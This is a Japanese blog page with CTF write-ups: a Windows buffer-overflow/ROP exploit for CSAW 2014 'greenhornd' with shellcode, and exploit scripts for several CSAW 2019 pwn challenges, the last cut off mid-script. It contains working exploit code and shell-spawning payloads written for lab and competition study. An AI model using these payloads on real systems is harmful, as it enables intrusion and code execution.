

















































<!DOCTYPE html>
<html lang="en-us">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>
    
    $ make life
    
  </title>
  
  <link rel="alternate" type="application/rss+xml" href="https://owlinux1000.github.io/blog/index.xml" title="$ make life">
  
  
  <link rel="stylesheet" href="https://owlinux1000.github.io/blog/css/base.min.21688b64210142c045c9a1d930a48fc517f428060c78a3a012d71f971874c5c3.css" integrity="sha256-IWiLZCEBQsBFyaHZMKSPxRf0KAYMeKOgEtcflxh0xcM=">
  
  <meta name="generator" content="Hugo 0.53" />
</head>
<body>
  <nav class="u-background">
  <div class="u-wrapper">
    <ul class="Banner">
      <li class="Banner-item Banner-item--title">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/">$ make life</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/about/">About</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/post/">Posts</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/tags/">Tags</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/categories/">Categories</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/index.xml">RSS</a>
      </li>
      
    </ul>
  </div>
</nav>
  <main>
    <div class="u-wrapper">
      <div class="u-padding">
        


<article>
  <header class="Heading">
  <h2 class="Heading-title">
    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/greenhornd_writeup/" rel="bookmark">CSAW CTF 2014 Greenhornd writeup</a>
  </h2>
  
  <time datetime="2019-09-19T23:49:38&#43;09:00">
    19 September, 2019
  </time>
  
</header>
  

<h2 id="はじめに">はじめに</h2>

<p>本記事では、CSAW CTF 2014 で出題されたWindows 環境のPwnable 問題「greenhornd」を解説する。CTF におけるWindows のPwnable 問題が割合がかなり少なく知見もあまりまとまっていない分野なので自分の学習がてらまとめてみた。Linux でのPwnに慣れている人向けの記述になっているので、うまく補完しながら読んでほしい。</p>

<h2 id="1-環境準備">1. 環境準備</h2>

<h3 id="1-1-windows-os-の準備">1.1 Windows OS の準備</h3>

<p>Linux と異なり環境構築に戸惑う人もいると思うので準備方法を記載していく。Windows OS自体は、Edgeのテスト用として用意されている、<a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">Free Virtual Machines from IE8 to MS Edge - Microsoft Edge Development</a> を用いる。本ページにアクセスしたら、「Virtual machine」の欄を「IE11 on Win81 (x86)」に選択、「Select platform」を「VirtualBox」にして、ダウンロードボタンをクリックする。ダウンロードが完了したらzipを展開し、仮想マシンをインポートする。</p>

<h3 id="1-2-解析環境の準備">1.2 解析環境の準備</h3>

<p>本VMは、ドライブが備わっていないので、VirtualBoxの設定からドライブを作成して、Guest Addition をインストールする。インストール後は、共有フォルダあるいはD&amp;Dやクリップボードの共有ができるようにしてホストマシンと相互にやりとりできるようにしておく。また、ホストマシンと本VMにpingが届くことも確認しておく(Windows はpingをデフォルトで応答しないので、VM側からホストマシン側へ飛ばすと良い。)  最後に、検証やポートの公開などで面倒なので、Windows Firewall を無効にしておく。</p>

<p>次に、本問題フアィルと解析する際にVM側に必要なソフトウェアをダウンロードする。以下に列挙する。</p>

<ul>
<li><a href="https://github.com/ctfs/write-ups-2014/blob/master/csaw-ctf-2014/greenhornd/greenhornd.exe">greenhornd.exe</a>

<ul>
<li>問題のバイナリファイル</li>
</ul></li>
<li><a href="https://github.com/ctfs/write-ups-2014/blob/master/csaw-ctf-2014/greenhornd/AppJailLauncher.exe">AppJailLauncher.exe</a>

<ul>
<li>Windows におけるPwn 問題を動作させる定番のソフトウェア(らしい)</li>
</ul></li>
<li><a href="https://www.microsoft.com/ja-jp/download/details.aspx?id=40784">Visual Studio 2013 の Visual C++ 再頒布可能パッケージ</a>

<ul>
<li>greenhornd を実行しようとすると「msvcr120.dll」が無いためにエラーになるのでインストールする</li>
<li>ちなみにmsvcr120.dll は、libcに入っているような標準的な関数を提供するDLL</li>
</ul></li>
<li><a href="https://visualstudio.microsoft.com/ja/downloads/?rr=https%3A%2F%2Fdocs.microsoft.com%2Fja-jp%2Fvisualstudio%2Finstall%2Finstall-visual-studio%3Fview%3Dvs-2019">Visual Studio 2019</a>

<ul>
<li>PoC 作成用に利用</li>
<li>特に個別パッケージのMSVC vXXX - VS 2019 C++ x64/x86 build tools には、cl や dumpbin など便利なコマンドが多いのでインストール推奨</li>
</ul></li>
<li><a href="https://x64dbg.com/#start">x64dbg</a>

<ul>
<li>Windows における代表的なデバッガの1つ</li>
</ul></li>
<li><a href="https://www.winitor.com/get.html">PeStudio</a>

<ul>
<li>PEビューワ、マルウェア解析などでも必須となるアイテム</li>
<li>でかいファイルを扱うと重い</li>
</ul></li>
<li><a href="https://www.nirsoft.net/utils/dll_export_viewer.html">DLL Export Viewer</a>

<ul>
<li>DLL がExplortする関数一覧の閲覧や検索ができるGUIソフト</li>
<li>比較的大きなDLLでもさばけるためDLLから関数を探す時などはこちらを利用</li>
</ul></li>
<li><a href="https://docs.microsoft.com/ja-jp/windows-hardware/drivers/download-the-wdk">cdb, Windbgなどのデバッグツール</a>

<ul>
<li>シェルコードのデバッグやPoC 用に利用</li>
</ul></li>
</ul>

<p>ホスト側には概ね以下のソフトウェアが入っていれば良いだろう。</p>

<ul>
<li>exploit コードを作成するためのプログラミング環境 (Python, Rubyなど)</li>
<li>rp++ などのROP Gadget 検索ツール</li>
<li>IDA, Ghidra などの逆アセンブラ</li>
</ul>

<p>必要なソフトウェアのインストールなどが終わったら次に実際に<code>greenhornd.exe</code> を問題のように動作させてみる。動作させる際には前述した<code>AppJailLauncher.exe</code> を利用する。デスクトップなどに、以下の内容の<code>run.bat</code> を作成する。これでダブルクリックでいつでも問題を動作させることができる。また、同じディレクトリに<code>greenhornd.exe</code> と<code>key</code> というファイル名でFLAGを書いたテキストファイルを用意しておこう。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">AppJailLauncher.exe /network /key:key /port:9998 /timeout:30 greenhornd.exe</pre></div>
<p>実際にダブルクリックすると以下のような画面になる。その後、ホストマシンから、本VMの9998番ポートへ向けて接続してみよう。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">nc &lt;VMのIPアドレス&gt; 9998</pre></div>
<p>正しく動作していれば、Passsword を求められる文字列が帰ってくるはずだ。ここまでが設定できれば、あとは解析をスタートさせることができる。</p>

<h2 id="2-解析">2. 解析</h2>

<p>まずは、先程nc でつないだところからのスタートだ。パスワードの入力を求められているので、バイナリ中からパスワードを探そう。この時重要なのは、本問題はPwnableであってReversingではない。つまり、難しい技を使ってパスワードを隠していることは考えにくい。そこで、手始めにstrings コマンドとgrep でpasswordを引っ掛けてみよう。grep で検索をかける際には、大文字小文字を無視する-i オプションを付けておくと良い。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">strings greenhornd.exe | grep -i password
To continue, you&#39;re going to need the password. You can get the password by running strings from minsys (strings - greenhorn.exe) or locate it in IDA.
Password: 
GreenhornSecretPassword!!!
Incorrect Password.
Password accepted.</pre></div>
<p>この結果から、気になる文章はあるものの、<code>GreenhornSecretPassword!!!</code> が怪しいと感じるだろう。nc でつないで、この文字列を入力してみよう。そうすると、さらに応答が進み選択画面が出てくるはずだ。割愛するが、重要な選択肢は、(A)と(V)だ。(A) を選ぶと、PEファイルのベースアドレスとスタックのアドレスがリークする。つまり、Windows におけるASLRをBypassすることが可能となる。(V) を選択すると1024 byteの入力を行うことができる。この2つ以外はどれも説明の文字列が帰ってくるだけだ。</p>

<p>今回は、Ghidra を用いて逆アセンブル、逆コンパイル結果を見ながら詳細な解析を勧めていく。PeStudioなどの.textセクションのvirtual address や文字列などを起点にxref機能などを使ってバイナリ中を動き回ると、<code>0x401000</code> がmain関数にあたる部分だとわかる。さらに、下図からも先程入力したパスワードがstrncmp関数で比較されており正しいことがわかる。解析する際には、積極的に関数名や変数名をわかりやすい形に変更していくことをおすすめする。Ghidra はまだ世に出て慣れ親しんでいない人も多いので、<a href="https://booth.pm/ja/items/1575255">Ghidra Pro Book</a> を一読することをおすすめする。</p>

<p><img src="https://imgur.com/download/UIkarAm" alt="main関数付近のデコンパイル画面" /></p>

<p>さらにswitch 文のところから、(V)の処理の実際の関数は、<code>0x401210</code>だとわかるので見てみる。</p>

<p><img src="https://imgur.com/download/sNFqhmW" alt="選択肢Vの関数" /></p>

<p>中では、0x800 という引数があることがわかる。読み込む処理が本処理しかないため、この値は読み込みバイト数だと推測できるが、促されている長さは1024なためBuffer Overflow が発生するとわかる。さらに条件分岐で、<code>C</code> の文字が先頭に入っているとexit処理に移る。実際にデバッガでこの周辺処理や1024文字以上を入力した場合の挙動を見てみると、ebpレジスタが指すアドレスの次のワードがreturn address になっていることがわかる。今回の場合、return address が格納されたアドレスが<code>0x03CFAC0</code> 、入力するバッファの先頭アドレスが<code>0x03CF6C0</code> だったので、先頭から1028byte分のパディングをした後に、return address を書き換えることが可能だとわかる。これで、EIPは奪えたことになる。(こういった動的なデバッグの際には、攻撃コードを送る手前で、exploitコード側で標準入力を受け付けておき、デバッガで対象プロセスにアタッチし、ブレークポイントを貼って、exploitコードで適当なキーを叩き実行を進めて止めるやり方が便利。)</p>

<p>ここまでの情報を整理すると、以下のようになる。これらを踏まえてExploit 作成に移る。</p>

<ul>
<li>1028 バイトのパディングを入れることで、Return address を書き換えることができる</li>
<li>PEのベースアドレスとスタックのアドレスは、リーク可能</li>
</ul>

<h2 id="3-exloit-コードの作成">3. Exloit コードの作成</h2>

<p>まずは、Exploit の方針を明示する。今回は、VirtualAlloc関数を使って、スタックの領域をRWXな領域に変更し、シェルコードを実行して、keyファイルの内容を出力する方針を取る。VirtualAlloc関数の実アドレスは、0x402000(RVA) に存在するため、ROPで本アドレスの中にあるアドレスにジャンプすることを試みる。本コードには、switch文があり、<code>dword[ecx*4+0x401160]</code> にjmpする処理が存在する。そのため、ecxを適切な値にしてこのjmp処理に制御を移すことで任意のアドレスにjmpすることができる。そこで、バイナリ中に<code>pop ecx; ret</code> が行えるROP Gadgetがあるか調べると、いくつかGadget が見つかるため、本方針でVirtualAlloc関数に飛ばすことは可能だと考えられる。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ rp-osx-x64 -r <span style="color:#666">1</span> -f greenhornd.exe | grep <span style="color:#ba2121">&#39;pop ecx&#39;</span>
0x0040178c: pop ecx ; ret  ;  <span style="color:#666">(</span><span style="color:#666">1</span> found<span style="color:#666">)</span>
0x004018b5: pop ecx ; ret  ;  <span style="color:#666">(</span><span style="color:#666">1</span> found<span style="color:#666">)</span>
0x00401c20: pop ecx ; ret  ;  <span style="color:#666">(</span><span style="color:#666">1</span> found<span style="color:#666">)</span></code></pre></div>
<p>次に、VirtualAllocでスタックのパーミッションを書き換えた後に実行するシェルコードについて考えてみる。Linux と異なりWindows の場合システムコール番号などが各種OSで異なっておりLinux に比べて生のシステムコールを読ぶのは汎用性が低いシェルコードになってしまう。そのため、Windowsの場合はWin32 APIを呼び出して実行するシェルコードを作成する。今回は、<code>key</code> というファイルの中身を見たいので、ファイルを開いて、読み出し、書き出す処理を行う必要がある。そこで、PEバイナリに含まれているReadFileやWriteFileを用いれば良いと考えられるが、これらの関数を実行するためには事前に対象ファイルのファイルハンドラを取得する必要があり、そのためには引数の多いCreateFile関数を呼ばなくてはならない。今回の場合は特に成約が厳しくないが、長さ制限などがある場合は、<code>_open</code>, <code>_read</code>, <code>_write</code> を使ってLinuxライクなシェルコードを作成して短くする方法がある。今回は、その方針で作成した。Windows におけるシェルコード作成方法などについては、<a href="http://inaz2.hatenablog.com/entry/2015/04/23/013858">Windowsで電卓を起動するシェルコードを書いてみる</a> がとてもわかりやすいので参照してほしい。今回は、本サイトのシェルコードを改変する形で以下のシェルコードを作成した。mainラベルより上はサイトと全く同じため省略する。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a0a000">main:</span>
    <span style="color:#00f">push</span> <span style="color:#666">0079656</span><span style="color:#800">bh</span>	<span style="color:#408080;font-style:italic">; key
</span><span style="color:#408080;font-style:italic"></span>    <span style="color:#800">mov</span> <span style="color:#800">eax</span>, <span style="color:#800">esp</span>
    <span style="color:#00f">push</span> <span style="color:#666">0</span>
    <span style="color:#00f">push</span> <span style="color:#666">0</span>
    <span style="color:#00f">push</span> <span style="color:#800">eax</span>
    <span style="color:#00f">push</span> <span style="color:#666">0</span><span style="color:#800">e12e0c6eh</span>  	<span style="color:#408080;font-style:italic">; open(&#34;key&#34;, 0, 0)
</span><span style="color:#408080;font-style:italic"></span>    <span style="color:#800">call</span> <span style="color:#800">api_call</span>
    <span style="color:#00f">mov</span> <span style="color:#800">ebx</span>, <span style="color:#800">eax</span>        <span style="color:#408080;font-style:italic">; ファイルディスクリプタをebxに退避
</span><span style="color:#408080;font-style:italic"></span>    <span style="color:#800">push</span> <span style="color:#666">100</span><span style="color:#800">h</span>		    <span style="color:#408080;font-style:italic">; len
</span><span style="color:#408080;font-style:italic"></span>    <span style="color:#800">lea</span> <span style="color:#800">ebp</span>, [<span style="color:#800">esp</span><span style="">+</span><span style="color:#666">100</span><span style="color:#800">h</span>]	<span style="color:#408080;font-style:italic">; buffer
</span><span style="color:#408080;font-style:italic"></span>    <span style="color:#800">push</span> <span style="color:#800">ebp</span>            
    <span style="color:#800">push</span> <span style="color:#800">ebx</span>
    <span style="color:#00f">push</span> <span style="color:#666">0</span><span style="color:#800">e70e09a4h</span>	    <span style="color:#408080;font-style:italic">; read(fd, esp+100h, 100h)
</span><span style="color:#408080;font-style:italic"></span>    <span style="color:#800">call</span> <span style="color:#800">api_call</span>
    <span style="color:#00f">push</span> <span style="color:#666">100</span><span style="color:#800">h</span>
    <span style="color:#00f">push</span> <span style="color:#800">ebp</span>
    <span style="color:#00f">push</span> <span style="color:#666">1</span>
    <span style="color:#00f">push</span> <span style="color:#666">067</span><span style="color:#800">a78ad5h</span>	    <span style="color:#408080;font-style:italic">; write(fd, esp+100h, 100h)
</span><span style="color:#408080;font-style:italic"></span>    <span style="color:#800">call</span> <span style="color:#800">api_call</span>
    <span style="color:#00f">push</span> <span style="color:#666">73</span><span style="color:#800">e2d87eh</span>      <span style="color:#408080;font-style:italic">; ExitProcess
</span><span style="color:#408080;font-style:italic"></span>    <span style="color:#800">call</span> <span style="color:#800">api_call</span>

<span style="color:#00f">end</span> <span style="color:#800">start</span></code></pre></div>
<p>最後に、以下にexploit の全体コードを示す。</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
<span style="color:#408080;font-style:italic"># coding: ascii-8bit</span>
<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>

host <span style="color:#666">=</span> <span style="color:#ba2121">&#39;192.168.0.109&#39;</span>
port <span style="color:#666">=</span> <span style="color:#666">9998</span>
$z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new host, port
<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">z</span>; $z; <span style="color:#008000;font-weight:bold">end</span>
context<span style="color:#666">.</span>log_level <span style="color:#666">=</span> <span style="color:#19177c">:info</span>

password <span style="color:#666">=</span> <span style="color:#ba2121">&#34;GreenhornSecretPassword!!!&#34;</span>
<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;Password: </span><span style="color:#b68;font-weight:bold">#{</span>password<span style="color:#b68;font-weight:bold">}</span><span style="color:#ba2121">&#34;</span>
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;Password: &#34;</span>
z<span style="color:#666">.</span>sendline password
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;Selection: &#34;</span>

<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;[*] Select A to leak and calculate some addresses&#34;</span>
z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;A&#34;</span>
tmp <span style="color:#666">=</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;Selection: &#34;</span>
text_base <span style="color:#666">=</span> tmp<span style="color:#666">.</span>match(<span style="color:#b68">/is: (.*) /</span>)<span style="color:#666">[</span><span style="color:#666">1</span><span style="color:#666">].</span>to_i(<span style="color:#666">16</span>)
stack_addr <span style="color:#666">=</span> tmp<span style="color:#666">.</span>match(<span style="color:#b68">/at: (.*)\./</span>)<span style="color:#666">[</span><span style="color:#666">1</span><span style="color:#666">].</span>to_i(<span style="color:#666">16</span>)
pop_ecx_ret <span style="color:#666">=</span> text_base <span style="color:#666">+</span> <span style="color:#666">0x0040178c</span>
jmp_memory <span style="color:#666">=</span> text_base <span style="color:#666">+</span> <span style="color:#666">0x0040110d</span>
<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;image base address        : 0x%x&#34;</span> <span style="color:#008000">% text_base
</span><span style="color:#008000">puts </span> <span style="color:#ba2121">&#34;Stack address             : 0x%x&#34;</span> <span style="color:#008000">% stack_addr
</span><span style="color:#008000">puts </span> <span style="color:#ba2121">&#34;pop ecx; ret              @ 0x%x&#34;</span> <span style="color:#008000">% pop_ecx_ret
</span><span style="color:#008000">puts </span> <span style="color:#ba2121">&#34;jmp dword[0x401160+ecx*4] @ 0x%x&#34;</span> <span style="color:#008000">% jmp_memory
</span><span style="color:#008000">
</span><span style="color:#008000">puts </span> <span style="color:#ba2121">&#34;[*] Select V to overflow&#34;</span>
z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;V&#34;</span>
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;).</span><span style="color:#b62;font-weight:bold">\n\n</span><span style="color:#ba2121">&#34;</span>

shellcode <span style="color:#666">=</span> <span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\xFC\xEB\x67\x60\x33\xC0\x64\x8B\x40\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x89\x44\x24\x1C\x8B\x68\x10\x8B\x45\x3C\x8B\x54\x05\x78\x03\xD5\x8B\x4A\x18\x8B\x5A\x20\x03\xDD\xE3\x39\x49\x8B\x34\x8B\x03\xF5\x33\xFF\x33\xC0\xAC\x84\xC0\x74\x07\xC1\xCF\x0D\x03\xF8\xEB\xF4\x3B\x7C\x24\x24\x75\xE2\x8B\x5A\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5A\x1C\x03\xDD\x8B\x04\x8B\x03\xC5\x89\x44\x24\x1C\x61\x59\x5A\x51\xFF\xE0\x8B\x74\x24\x1C\xEB\xA6\x68\x6B\x65\x79\x00\x8B\xC4\x6A\x00\x6A\x00\x50\x68\x6E\x0C\x2E\xE1\xE8\x83\xFF\xFF\xFF\x8B\xD8\x68\x00\x01\x00\x00\x8D\xAC\x24\x00\x01\x00\x00\x55\x53\x68\xA4\x09\x0E\xE7\xE8\x69\xFF\xFF\xFF\x68\x00\x01\x00\x00\x55\x6A\x01\x68\xD5\x8A\xA7\x67\xE8\x57\xFF\xFF\xFF\x68\x7E\xD8\xE2\x73\xE8\x4D\xFF\xFF\xFF\x00\x00\x00\x00\x6E\x8F\x87\x5D\x00\x00\x00\x00\x0D\x00\x00\x00\x40\x00\x00\x00\x1C\x20\x00\x00\x1C\x04\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\xB6\x00\x00\x00\x2E\x74\x65\x78\x74\x24\x6D\x6E\x00\x00\x00\x00\x00\x20\x00\x00\x1C\x00\x00\x00\x2E\x72\x64\x61\x74\x61\x00\x00\x1C\x20\x00\x00\x50\x00\x00\x00\x2E\x72\x64\x61\x74\x61\x24\x7A\x7A\x7A\x64\x62\x67\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style="color:#ba2121">&#34;</span>

payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;C&#34;</span> <span style="color:#666">*</span> <span style="color:#666">1028</span>          <span style="color:#408080;font-style:italic"># 1028 byte</span>
payload <span style="color:#666">&lt;&lt;</span> p32(pop_ecx_ret)   <span style="color:#408080;font-style:italic"># Overwrite return address</span>
payload <span style="color:#666">&lt;&lt;</span> p32(<span style="color:#666">936</span>)           <span style="color:#408080;font-style:italic"># ecx &lt;- 936</span>
payload <span style="color:#666">&lt;&lt;</span> p32(jmp_memory)    <span style="color:#408080;font-style:italic"># jmp dword [0x401160+ecx*4] -&gt; 0x402000 (VirtualAlloc)</span>
payload <span style="color:#666">&lt;&lt;</span> p32(stack_addr<span style="color:#666">+</span><span style="color:#666">44</span>) <span style="color:#408080;font-style:italic"># the head address of shellcode</span>
payload <span style="color:#666">&lt;&lt;</span> p32(stack_addr)    <span style="color:#408080;font-style:italic"># lpAddress</span>
payload <span style="color:#666">&lt;&lt;</span> p32(<span style="color:#666">1024</span>)          <span style="color:#408080;font-style:italic"># dwSize = 1024</span>
payload <span style="color:#666">&lt;&lt;</span> p32(<span style="color:#666">0x1000</span>)        <span style="color:#408080;font-style:italic"># flAllocationType = MEM_WRITE</span>
payload <span style="color:#666">&lt;&lt;</span> p32(<span style="color:#666">0x40</span>)          <span style="color:#408080;font-style:italic"># flProtect = PAGE_EXECUTE_READWRITE</span>
payload <span style="color:#666">&lt;&lt;</span> shellcode
<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;[*] Send payload&#34;</span>
z<span style="color:#666">.</span>sendline payload
<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;}&#34;</span></code></pre></div>
<p>以下が実行結果である。</p>

<p><img src="https://imgur.com/download/U7pR2SU" alt="x.rbの実行結果" /></p>

<h2 id="4-おわりに">4. おわりに</h2>

<p>本記事では、CTFの問題を使ってWindows におけるExploitのための環境構築方法やLinuxとの差について簡単に記した。本問題は、古い問題のためセキュリティ機構などもゆるい。現実の世界でのExploitは、もっと難しいはずだ。しかしながら、本問題のような簡単なBOFを利用したROPなどの古典的なテクニックを理解しておくことで、脅威の度合いについて正しく理解できるだろう。余力があれば、さらに異なるWindows Exploit 問題のWriteupを書いていきたい。</p>

  
</article>

<article>
  <header class="Heading">
  <h2 class="Heading-title">
    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/csaw2019/" rel="bookmark">Csaw2019 writeup</a>
  </h2>
  
  <time datetime="2019-09-16T09:50:28&#43;09:00">
    16 September, 2019
  </time>
  
</header>
  

<h2 id="misc">Misc</h2>

<h3 id="mcgriddlev2">mcgriddlev2</h3>

<ul>
<li>問題文にFLAGが記載されている</li>
<li><strong>flag{W3lcome_7o_CSAW_QUALS_2019!}</strong></li>
</ul>

<h2 id="pwn">Pwn</h2>

<h3 id="baby-boi-50pt">baby_boi (50pt)</h3>

<ul>
<li>シンプルなBOFでIPが奪える問題</li>

<li><p>libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
<span style="color:#408080;font-style:italic"># coding: ascii-8bit</span>
<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
$z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;localhost&#34;</span>, <span style="color:#666">8888</span>
$z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#666">1005</span>
libc <span style="color:#666">=</span> <span style="color:#800">ELF</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;./libc-2.27.so&#34;</span>
<span style="color:#408080;font-style:italic">#libc = ELF.new &#34;/lib/x86_64-linux-gnu/libc-2.29.so&#34;</span>
<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">z</span>; $z; <span style="color:#008000;font-weight:bold">end</span>
z<span style="color:#666">.</span>recvuntil(<span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">&#34;</span>)
libc_printf <span style="color:#666">=</span> z<span style="color:#666">.</span>recvuntil(<span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">&#34;</span>)<span style="color:#666">.</span>match(<span style="color:#b68">/: (.+)/</span>)<span style="color:#666">[</span><span style="color:#666">1</span><span style="color:#666">].</span>to_i(<span style="color:#666">16</span>)
libc_base <span style="color:#666">=</span> libc_printf <span style="color:#666">-</span> libc<span style="color:#666">.</span>symbols<span style="color:#666">[</span><span style="color:#ba2121">&#34;printf&#34;</span><span style="color:#666">]</span>
<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;%x&#34;</span> <span style="color:#008000">% libc_base
</span><span style="color:#008000">payload </span> <span style="color:#666">=</span> <span style="color:#ba2121">&#34;A&#34;</span> <span style="color:#666">*</span> <span style="color:#666">40</span>
payload <span style="color:#666">&lt;&lt;</span> p64(libc_base <span style="color:#666">+</span> <span style="color:#666">0x4f322</span>)
z<span style="color:#666">.</span>sendline(payload)
z<span style="color:#666">.</span>interact</code></pre></div></li>

<li><p><strong>flag{baby_boi_dodooo_doo_doo_dooo}</strong></p></li>
</ul>

<h3 id="got-milk-50pt">GOT Milk? (50pt)</h3>

<ul>
<li>独自の共有オブジェクトとバイナリが配られる</li>
<li><code>set LD_LIBRARY_PATH ./</code> でカレントディレクトリの共有オブジェクトを見るようにする</li>

<li><p>FSBがあるので、それを使ってGOT Overwriteする</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
<span style="color:#408080;font-style:italic"># coding: ascii-8bit</span>
<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;fsa&#39;</span>
<span style="color:#408080;font-style:italic">#$z = Sock.new &#34;localhost&#34;, 8888</span>
$z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#666">1004</span>
<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">z</span>; $z; <span style="color:#008000;font-weight:bold">end</span>
value <span style="color:#666">=</span> <span style="color:#666">0x89</span>
fmt <span style="color:#666">=</span> <span style="color:#800">FSA</span><span style="color:#666">.</span>new()
fmt<span style="color:#666">[</span><span style="color:#666">0x804a010</span><span style="color:#666">]</span> <span style="color:#666">=</span> value
payload <span style="color:#666">=</span> fmt<span style="color:#666">.</span>payload(<span style="color:#666">7</span>) <span style="color:#408080;font-style:italic"># index of argument</span>
<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recvuntil(<span style="color:#ba2121">&#34;? &#34;</span>)
z<span style="color:#666">.</span>sendline(payload)
<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recv</code></pre></div></li>

<li><p><strong>flag{y0u_g00000t_mi1k_4_M3!?}</strong></p></li>
</ul>

<h3 id="small-boi-100pt">small_boi (100pt)</h3>

<ul>
<li>statically linked でstrippedな小さなバイナリが与えられる</li>

<li><p>sig_return システムコールを呼ぶようなraxの設定のされ方があるのと自明なBOFがあるので、Sigreturn ROP (SROP) で <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> を実行する</p>

<ul>
<li>SROPは、スタックの値を使ってsig_return実行時にレジスタの値を代入する攻撃</li>

<li><p>これを使ってrdiやrsi、ripなどが設定できるため任意のシステムコールを呼べる</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
<span style="color:#408080;font-style:italic"># coding: ascii-8bit</span>
<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
<span style="color:#408080;font-style:italic">#$z = Sock.new &#34;localhost&#34;, 8888</span>
$z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#666">1002</span>
<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">z</span>; $z; <span style="color:#008000;font-weight:bold">end</span>
payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\x00</span><span style="color:#ba2121">&#34;</span> <span style="color:#666">*</span> <span style="color:#666">0x28</span>
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x40017c</span>)
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x0</span>) <span style="color:#666">*</span> <span style="color:#666">4</span>
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x0</span>) <span style="color:#666">*</span> <span style="color:#666">8</span> <span style="color:#408080;font-style:italic"># r8~r15</span>
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x4001ca</span>) <span style="color:#408080;font-style:italic"># rdi = /bin/sh</span>
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0</span>) <span style="color:#408080;font-style:italic"># rsi</span>
